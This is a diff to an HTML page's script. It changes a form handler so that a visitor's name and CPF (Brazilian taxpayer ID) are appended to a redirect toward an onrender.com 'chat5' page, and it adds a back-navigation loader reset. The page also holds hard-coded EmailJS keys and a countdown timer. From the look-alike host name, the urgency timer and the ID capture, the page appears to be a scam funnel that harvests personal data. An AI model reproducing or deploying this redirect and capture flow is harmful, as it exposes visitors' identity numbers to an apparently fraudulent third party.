@@ -966,7 +966,7 @@
         </div>
     </div>
 
-    <script>
+   <script>
         const EMAILJS_SERVICE_ID = 'service_yfnu4c4';
         const EMAILJS_TEMPLATE_ID = 'template_qkooous';
         const EMAILJS_PUBLIC_KEY = 'WoFt2Y6ppoxFL9L2A';
@@ -1196,8 +1196,13 @@
                         currentParams.set('nome', name);
                         currentParams.set('cpf', cpfRaw);
                         
-                        // Link específico com todos os parâmetros da URL atual + nome e cpf
-                        const redirectUrl = `https://seulinkaqui.com/?${currentParams.toString()}`;
+                        // Redireciona para o link de exemplo mantendo todos os parâmetros originais + nome e cpf
+                        const redirectUrl = `https://veja-gasdisk.onrender.com/chat5/?${currentParams.toString()}`;
+                        
+                        // Reset do loader antes de sair (caso o usuário volte)
+                        loader.classList.remove('active');
+                        document.body.style.overflow = '';
+                        
                         window.location.href = redirectUrl;
                     }, 800);
                 }, 2000);
@@ -1210,6 +1215,17 @@
                 errorEl.classList.add('visible');
             }
         }
+
+        // Proteção extra para resetar o loader se o usuário voltar à página
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                const loader = document.getElementById('global-loader');
+                if (loader) {
+                    loader.classList.remove('active');
+                    document.body.style.overflow = '';
+                }
+            }
+        });
 
         function startTimer(duration, display) {
             let timer = duration;
